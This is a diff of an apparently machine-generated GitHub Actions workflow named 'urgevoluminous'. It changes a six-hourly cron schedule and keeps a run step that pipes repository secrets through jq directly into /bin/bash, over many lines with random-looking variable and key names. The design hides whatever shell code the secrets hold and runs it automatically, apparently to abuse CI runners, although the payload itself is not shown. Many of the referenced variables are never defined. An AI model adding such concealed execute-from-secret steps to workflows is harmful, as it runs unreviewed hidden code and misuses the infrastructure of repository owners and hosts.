@@ -1,9 +1,9 @@
 name: urgevoluminous
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
+    - cron: '16 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,27 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: urgevoluminous
         env:
-          nx29060: ${{ secrets.nx29060 }}
+          zeip68: ${{ secrets.zeip68 }}
         run: |
-          echo $nx29060 | jq -r .xft39 | /bin/bash
-          echo $aksb452 | jq -r .qxp115 | /bin/bash
-          echo $wl3759 | jq -r .y6131 | /bin/bash
-          echo $sinvr542 | jq -r .lwdv05 | /bin/bash
-          echo $xqx743 | jq -r .p72715 | /bin/bash
-          echo $d36 | jq -r .qmz980 | /bin/bash
-          echo $vtc595 | jq -r .a64 | /bin/bash
-          echo $jv21 | jq -r .huobd00 | /bin/bash
-          echo $qsdix62 | jq -r .q8 | /bin/bash
-          echo $ckblf3 | jq -r .gayy853 | /bin/bash
-          echo $gf854 | jq -r .l6 | /bin/bash
-          echo $ufr4 | jq -r .nxgan293 | /bin/bash
-          echo $od19 | jq -r .qemgp14284 | /bin/bash
-          echo $jw07575 | jq -r .ctlvn672 | /bin/bash
-          echo $r3472 | jq -r .y81112 | /bin/bash
-          echo $jxk15 | jq -r .mvegd42 | /bin/bash
-          echo $kcer3901 | jq -r .vtkq60166 | /bin/bash
-          echo $ipdxb01 | jq -r .z7 | /bin/bash
-          echo $pqwyr35401 | jq -r .kvad4324 | /bin/bash
-          echo $mbc96 | jq -r .anm3133 | /bin/bash
-          echo $cfcr19633 | jq -r .en2684 | /bin/bash
+          echo $zeip68 | jq -r .ecj80220 | /bin/bash
+          echo $q105 | jq -r .jngd394 | /bin/bash
+          echo $o194 | jq -r .xbiq16 | /bin/bash
+          echo $xugbr9919 | jq -r .qi2995 | /bin/bash
+          echo $x243 | jq -r .quuy770 | /bin/bash
+          echo $oew51 | jq -r .wfklm720 | /bin/bash
+          echo $au08 | jq -r .exk11 | /bin/bash
+          echo $b425 | jq -r .om2 | /bin/bash
+          echo $db9 | jq -r .hgg83310 | /bin/bash
+          echo $nyip75 | jq -r .rtbrp57778 | /bin/bash
 
